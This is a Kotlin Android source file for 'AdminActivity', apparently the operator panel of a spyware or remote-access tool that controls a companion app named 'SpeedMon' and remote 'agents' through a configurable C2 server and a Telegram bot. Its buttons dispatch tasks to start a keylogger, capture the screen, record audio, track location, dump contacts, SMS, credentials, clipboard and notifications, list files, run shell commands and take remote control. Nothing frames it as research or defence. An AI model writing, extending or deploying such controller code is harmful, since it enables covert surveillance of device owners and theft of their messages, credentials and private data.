package com.spyadmin

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit

class AdminActivity : AppCompatActivity() {

    private val gson = Gson()
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private lateinit var adapter: AgentAdapter
    private var selectedAgent: Agent? = null
    private lateinit var prefs: SharedPreferences
    private var resultReceiver: ResultReceiver? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)

        prefs = getSharedPreferences("admin_config", MODE_PRIVATE)

        val rvAgents = findViewById<RecyclerView>(R.id.rvAgents).apply {
            layoutManager = LinearLayoutManager(this@AdminActivity)
            adapter = AgentAdapter(onClick = { agent ->
                selectedAgent = agent
                updateAgentDetails(agent)
            })
        }

        findViewById<Button>(R.id.btnRefresh).setOnClickListener { loadAgents() }
        findViewById<Button>(R.id.btnTaskKeylogger).setOnClickListener { sendTask("keylogger", mapOf("action" to "start")) }
        findViewById<Button>(R.id.btnTaskScreen).setOnClickListener { sendTask("screen", mapOf("action" to "capture")) }
        findViewById<Button>(R.id.btnTaskAudio).setOnClickListener { sendTask("audio", mapOf("action" to "start", "duration" to 30)) }
        findViewById<Button>(R.id.btnTaskLocation).setOnClickListener { sendTask("location", mapOf("action" to "get")) }
        findViewById<Button>(R.id.btnTaskContacts).setOnClickListener { sendTask("contacts", mapOf()) }
        findViewById<Button>(R.id.btnTaskSms).setOnClickListener { sendTask("sms", mapOf()) }
        findViewById<Button>(R.id.btnTaskFiles).setOnClickListener { sendTask("files", mapOf("action" to "list", "path" to "/sdcard")) }
        findViewById<Button>(R.id.btnTaskApps).setOnClickListener { sendTask("apps", mapOf("action" to "list")) }
        findViewById<Button>(R.id.btnTaskWifi).setOnClickListener { sendTask("wifi", mapOf("action" to "scan")) }
        findViewById<Button>(R.id.btnTaskShell).setOnClickListener { sendTask("shell", mapOf("command" to "id")) }
        findViewById<Button>(R.id.btnTaskCreds).setOnClickListener { sendTask("creds", mapOf()) }
        findViewById<Button>(R.id.btnTaskClipboard).setOnClickListener { sendTask("clipboard", mapOf("action" to "get")) }
        findViewById<Button>(R.id.btnTaskNotifications).setOnClickListener { sendTask("notifications", mapOf("action" to "dump")) }
        findViewById<Button>(R.id.btnRemoteControl).setOnClickListener { openRemoteControl() }
        findViewById<Button>(R.id.btnConfigC2).setOnClickListener { showC2Config() }
        findViewById<Button>(R.id.btnTestLocal).setOnClickListener { testLocalConnection() }

        loadAgents()
        registerResultReceiver()

        // Start Telegram bot
        val telegramBot = TelegramBotService(this)
        telegramBot.start()
    }

    private fun registerResultReceiver() {
        resultReceiver = ResultReceiver()
        val filter = IntentFilter("com.speedmon.ACTION_RESULT")
        val receiver = resultReceiver
        if (receiver != null) {
            LocalBroadcastManager.getInstance(this).registerReceiver(receiver, filter)
        }
    }

    private fun getC2Url(): String {
        return prefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
    }

    private fun showC2Config() {
        val currentUrl = getC2Url()
        val input = android.widget.EditText(this).apply {
            hint = "C2 Server URL (e.g., https://your-server.com/api)"
            setText(currentUrl)
        }
        android.app.AlertDialog.Builder(this)
            .setTitle("Configure C2 Server")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val newUrl = input.text.toString().trim()
                if (newUrl.isNotEmpty()) {
                    prefs.edit().putString("c2_url", newUrl).apply()
                    Toast.makeText(this@AdminActivity, "C2 URL saved", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun loadAgents() {
        // Try C2 first
        request("GET", "/api/agents") { resp ->
            val agents = gson.fromJson(resp, Array<Agent>::class.java).toList()
            runOnUiThread { adapter.submitList(agents) }
        }
        // Also add local SpeedMon as an agent
        runOnUiThread {
            val localAgent = Agent(
                id = "local-speedmon-${android.os.Build.SERIAL}",
                hostname = android.os.Build.MODEL,
                os = "android",
                arch = System.getProperty("os.arch"),
                androidVersion = android.os.Build.VERSION.RELEASE,
                sdk = android.os.Build.VERSION.SDK_INT,
                rooted = false,
                lastSeen = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date())
            )
            adapter.submitList(listOf(localAgent))
        }
    }

    private fun sendTask(capability: String, args: Map<String, Any>) {
        // Send to local SpeedMon via broadcast
        sendLocalTask(capability, args)
        
        // Also send to C2 if configured
        selectedAgent?.let { agent ->
            if (!agent.id.startsWith("local-")) {
                val payload = mapOf(
                    "action" to "task",
                    "agent_id" to agent.id,
                    "capability" to capability,
                    "args" to gson.toJson(args),
                    "timeout" to 30
                )
                request("POST", "/api/command", payload) { resp ->
                    runOnUiThread { Toast.makeText(this@AdminActivity, "Task sent to C2: $capability", Toast.LENGTH_SHORT).show() }
                }
            }
        }
    }

    private fun sendLocalTask(capability: String, args: Map<String, Any>) {
        val taskId = java.util.UUID.randomUUID().toString()
        val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
            setPackage("com.speedmon")
        }
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
        Toast.makeText(this, "Task sent to SpeedMon: $capability", Toast.LENGTH_SHORT).show()
    }

    private fun testLocalConnection() {
        // Send a ping to SpeedMon
        val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
            putExtra("capability", "apps")
            putExtra("args", "{}")
            putExtra("task_id", "test-${System.currentTimeMillis()}")
            setPackage("com.speedmon")
        }
        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
        Toast.makeText(this, "Test command sent to SpeedMon", Toast.LENGTH_SHORT).show()
    }

    private fun openRemoteControl() {
        selectedAgent?.let { agent ->
            val intent = Intent(this, RemoteControlActivity::class.java).apply {
                putExtra("agent", agent.toJson())
            }
            startActivity(intent)
        }
    }

    private fun request(method: String, endpoint: String, body: Any? = null, callback: (String) -> Unit) {
        val url = "${getC2Url()}$endpoint"
        val requestBody = body?.let { it.toJson().toRequestBody("application/json".toMediaType()) }
        val request = Request.Builder().url(url).method(method, requestBody).build()
        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                runOnUiThread { Toast.makeText(this@AdminActivity, "C2 Error: ${e.message}", Toast.LENGTH_SHORT).show() }
            }
            override fun onResponse(call: okhttp3.Call, response: Response) {
                response.body?.string()?.let { callback(it) }
            }
        })
    }

    private fun updateAgentDetails(agent: Agent) {
        findViewById<TextView>(R.id.tvAgentId).text = "ID: ${agent.id}"
        findViewById<TextView>(R.id.tvHostname).text = "Device: ${agent.hostname}"
        findViewById<TextView>(R.id.tvOs).text = "OS: ${agent.os} ${agent.androidVersion} (SDK ${agent.sdk})"
        findViewById<TextView>(R.id.tvArch).text = "Arch: ${agent.arch}"
        findViewById<TextView>(R.id.tvRooted).text = "Rooted: ${agent.rooted}"
        findViewById<TextView>(R.id.tvLastSeen).text = "Last Seen: ${agent.lastSeen}"
    }

    override fun onDestroy() {
        super.onDestroy()
        val receiver = resultReceiver
        if (receiver != null) {
            try {
                LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
            } catch (e: Exception) {
                // ignore
            }
        }
    }

    private inner class ResultReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val taskId = intent.getStringExtra("task_id") ?: ""
            val result = intent.getStringExtra("result") ?: ""
            val error = intent.getStringExtra("error") ?: ""
            val status = intent.getStringExtra("status") ?: ""
            runOnUiThread {
                Toast.makeText(this@AdminActivity, "Result [$status]: $result", Toast.LENGTH_LONG).show()
            }
        }
    }
}

class AgentAdapter(private val onClick: (Agent) -> Unit) :
    RecyclerView.Adapter<AgentAdapter.VH>() {

    private var agents = emptyList<Agent>()

    fun submitList(list: List<Agent>) { agents = list; notifyDataSetChanged() }

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
        val view = LayoutInflater.from(parent.context).inflate(R.layout.item_agent, parent, false)
        return VH(view)
    }

    override fun onBindViewHolder(holder: VH, position: Int) {
        holder.bind(agents[position])
    }

    override fun getItemCount() = agents.size

    inner class VH(view: View) : RecyclerView.ViewHolder(view) {
        private val tvName: TextView = view.findViewById(R.id.tvName)
        private val tvId: TextView = view.findViewById(R.id.tvId)
        private val tvStatus: TextView = view.findViewById(R.id.tvStatus)

        fun bind(agent: Agent) {
            tvName.text = agent.hostname
            val idLen = agent.id.length
            val endIndex = if (idLen >= 8) 8 else idLen
            tvId.text = agent.id.substring(0, endIndex)
            tvStatus.text = if (agent.rooted) "ROOTED" else if (agent.id.startsWith("local-")) "LOCAL" else "USER"
            itemView.setOnClickListener { onClick(agent) }
        }
    }
}